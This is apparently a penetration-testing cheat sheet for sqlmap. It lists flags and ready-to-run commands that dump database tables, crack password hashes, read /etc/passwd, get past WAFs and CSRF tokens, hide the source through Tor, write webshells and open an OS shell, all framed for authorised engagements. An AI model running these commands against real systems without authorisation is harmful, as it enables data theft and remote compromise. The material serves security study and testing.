---
tool: sqlmap
slug: sqlmap
stages: [pre-compromise]
targets: [windows, linux]
category: SQL injection
platforms: [linux, web]
services: [http, https, mysql, mssql, postgres]
ports: [80, 443, 8080, 1433, 3306, 5432]
tags: [sql-injection, database, exploitation, web, waf-bypass, os-shell]
attack: [T1190]
summary: Automates finding and exploiting SQL injection. Confirms the flaw, fingerprints the database, dumps data, cracks the hashes it finds, and: where the configuration allows: reads files or gets command execution. Point it at a request you suspect is injectable, and lean on its tuning and bypass options when a plain run stalls.
references:
  - sqlmap GitHub | https://github.com/sqlmapproject/sqlmap
  - sqlmap usage wiki | https://github.com/sqlmapproject/sqlmap/wiki/Usage
---

## When to reach for it

A parameter looks injectable (an error on a quote, a different response to `1 AND 1=1` vs `1 AND 1=2`, or a measurable delay on a `SLEEP`). sqlmap confirms it and does the tedious extraction, cracking and, where privileges allow, file access or a shell. Capture the exact request first — cookies, headers, body and all — so sqlmap tests the real thing as the authenticated user. For the fundamentals behind what it is doing, see [Manual SQL injection](/cpts/#tool-sql-injection).

## Key flags

- `-u "URL"` / `-r request.txt`: target URL, or a saved raw HTTP request (best for POST, headers and cookies).
- `-p param` / `*`: test only this parameter, or mark a custom injection point with an asterisk (works in the URL, body, a header or a cookie, e.g. `--cookie "id=1*"`).
- `--data`, `--cookie`, `-H/--header`, `--method`: shape the request; JSON and XML bodies are parsed too.
- `--batch`: take default answers, no prompts.
- `--level 1-5`, `--risk 1-3`: how hard to test — higher adds boundaries and vectors (and, at risk 3, `OR` payloads needed for login forms), slower and riskier.
- `--technique=BEUST`: restrict to Boolean, Error, Union, Stacked, Time (e.g. `--technique=BEU` to skip time-based and stacked).
- `--prefix` / `--suffix`: fix the boundary when the vector sits inside brackets or a `LIKE`.
- `--string` / `--code` / `--titles` / `--text-only`: pin blind detection to a marker string, an HTTP code, the page title, or visible text only.
- `--banner --current-user --current-db --is-dba`: quick fingerprint.
- `--dbs --tables --columns --schema --dump`: enumerate and extract; `-D db -T table -C col`, `--where`, `--start/--stop` to scope it.
- `--search -T/-C name`: hunt tables or columns by keyword across every database.
- `--passwords`: pull and offer to crack DBMS account hashes; table hashes are offered for cracking on `--dump`.
- `--random-agent`, `--tamper=...`, `--csrf-token`, `--randomize`, `--eval`, `--chunked`, `--proxy`, `--tor`: beat protections (below).
- `--parse-errors`, `-t file`, `-v 6`: surface DBMS errors, log all traffic, raise verbosity when a run misbehaves.
- `--file-read`, `--file-write`/`--file-dest`, `--os-shell`: filesystem and command execution where the DBMS and privileges allow.

## Commands

Set up the request. Paste a browser's **Copy as cURL** and swap `curl` for `sqlmap`, or mark the parameter in a body with `*`:

```bash
sqlmap -r request.txt -p id --batch
sqlmap "http://HOST/" --data "uid=1*&name=test" --batch
```

Quick fingerprint once a parameter is confirmed:

```bash
sqlmap -r request.txt --batch --banner --current-user --current-db --is-dba
```

Enumerate, then dump only what the engagement needs:

```bash
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt -D appdb --tables --batch
sqlmap -r request.txt -D appdb -T users --dump --batch
sqlmap -r request.txt --search -C pass --batch        # find password columns anywhere
```

Beat common protections (bad user-agent, WAF, anti-CSRF token):

```bash
sqlmap -r request.txt --random-agent --tamper=between,randomcase --batch
sqlmap -u "http://HOST/" --data "id=1&csrf-token=TOKEN" --csrf-token "csrf-token" --batch
```

Debug a run that is not detecting (show the DBMS error, log the traffic):

```bash
sqlmap -r request.txt --parse-errors -v 3 --batch
sqlmap -r request.txt -t /tmp/traffic.txt --proxy "http://127.0.0.1:8080" --batch
```

File access and a shell where privileges allow (needs DBA / `FILE` and a writable web root):

```bash
sqlmap -r request.txt --file-read "/etc/passwd" --batch
sqlmap -r request.txt --os-shell --technique=E --batch   # error-based gives direct output
```

## Workflow

1. Find the candidate parameter manually; save the full request to `request.txt`.
2. Run sqlmap on the request with `--batch` to confirm injectability and fingerprint the DBMS. If nothing bites, raise `--level`/`--risk`, add `--parse-errors -v 3`, and check for a WAF (`--random-agent`, then a tamper chain).
3. Fingerprint with `--banner --current-user --current-db --is-dba`.
4. Enumerate `--dbs`, then the interesting database's `--tables`/`--columns` (or `--search` by keyword), and `--dump` only the proof you need.
5. Let sqlmap crack any hashes it recognises against its wordlist; take `--passwords` for DBMS account hashes too.
6. If `--is-dba` is true, try `--file-read`, then `--file-write`/`--file-dest` for a webshell, or `--os-shell` — far noisier, so in scope and documented only.

## Notes

Start at low `--level`/`--risk` and raise only when needed: the highest settings send thousands of payloads per parameter, and risk 3 includes `OR` vectors that can modify data on `UPDATE`/`DELETE`-backed queries. Always prefer `-r request.txt` over `-u` for anything with a session, so you test as an authenticated user. Blind extraction and `--os-shell` hit the database hard — mind target stability. sqlmap writes everything (session, dumps, logs) under `~/.local/share/sqlmap/output/<host>/` and resumes from the session file on the next run, so a re-run skips re-detection. For protections beyond a user-agent block, `--tamper` rewrites payloads (e.g. `between`, `space2comment`, `randomcase`; `--list-tampers` for the full set), `--randomize`/`--eval` satisfy unique-value or calculated parameters, `--chunked` and HTTP parameter pollution split blacklisted keywords, and `--proxy`/`--tor` (with `--check-tor`) conceal the source IP. Dumping entire databases of real data is rarely in scope: extract proof, not everything, and treat any recovered credentials as sensitive loot.
